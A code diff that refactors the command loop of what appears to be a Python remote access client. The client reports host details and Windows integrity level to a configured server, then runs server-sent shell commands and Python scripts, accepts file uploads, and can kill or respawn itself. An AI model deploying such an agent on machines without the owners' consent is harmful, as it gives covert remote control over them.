@@ -1,4 +1,3 @@
-import inspect
 import json
 import os
 import platform
@@ -7,13 +6,13 @@ import subprocess
 import sys
 import time
 
-from client.command import Command, get_command_list
+from client.command import Command, get_command_list, execute_command
 from client.config import SERVER_ADDR
 from client.server import Server
-from common.util import logger, get_write_stream, parse
+from common.util import logger, get_write_stream
 
 if os.name == 'nt':
-    from client.win32util import get_integrity_level, get_executable_path
+    from client.command import INTEGRITY_LEVEL, EXECUTABLE_PATH
 
 
 class Client:
@@ -28,7 +27,7 @@ class Client:
         info = {
             'os': platform.platform(),
             'hostname': socket.gethostname(),
-            'integrity': get_integrity_level() if os.name == 'nt' else 'N/A',
+            'integrity': INTEGRITY_LEVEL if os.name == 'nt' else 'N/A',
             'cwd': os.getcwd(),
             'commands': get_command_list()
         }
@@ -40,24 +39,33 @@ class Client:
         while True:
             try:
                 head = self.server.recv_head()
-                id = head['id']
-                type = head['type']
+                command_id = head['id']
+                command_type = head['type']
+                result = None
                 try:
-                    result = None
-                    if type == 'file':
+                    if command_type == 'file':
                         filename = head['filename']
                         self.server.recv_body(head, file_stream=get_write_stream(filename))
-                        result = 1, '\nFile uploaded to: {}'.format(os.path.abspath(filename))
+                        result = 1, f'File uploaded to: {os.path.abspath(filename)}'
                     else:
-                        body = self.server.recv_body(head)
-                        if type == 'command':
-                            result = self.exec_cmd(body, id=id)
-                        elif type == 'script':
-                            result = Command.pyexec(body, json.loads(head['args']))
-                    if result:
-                        self.server.send_result(*result, id=id)
+                        command = self.server.recv_body(head)
+                        if command_type == 'command':
+                            if command == 'kill':
+                                self.server.close()
+                                sys.exit(0)
+                            elif command == 'reset':
+                                subprocess.Popen(EXECUTABLE_PATH)
+                                self.server.close()
+                                sys.exit(0)
+                            Command.server = self.server
+                            Command.id = command_id
+                            result = execute_command(command)
+                        elif command_type == 'script':
+                            result = Command.pyexec(command, json.loads(head['args']))
                 except Exception as e:
-                    self.server.send_result(0, str(e) + '\n', id=id)
+                    result = 0, f'{e}\n'
+                if result:
+                    self.server.send_result(*result, id=command_id)
             except SystemExit:
                 logger.info('Server closed this connection')
                 break
@@ -66,30 +74,6 @@ class Client:
                 self.server.close()
                 self.server = Server()
                 self.connect()
-
-    def exec_cmd(self, cmd, id):
-        Command.server = self.server
-        Command.id = id
-        cls = Command()
-        if cmd == 'kill':
-            self.server.close()
-            sys.exit(0)
-        elif cmd == 'reset':
-            subprocess.Popen(get_executable_path())
-            self.server.close()
-            sys.exit(0)
-        cmd_name, cmd_arg = parse(cmd)
-        if hasattr(cls, cmd_name):
-            func = getattr(cls, cmd_name)
-            if not len(inspect.getfullargspec(func).args):
-                status, result = func() or (None, None)
-            else:
-                status, result = func(cmd_arg) or (None, None)
-            if None not in [status, result]:
-                result += '\n'
-                return status, result
-        else:
-            return cls.shell(cmd)
 
 
 if __name__ == '__main__':
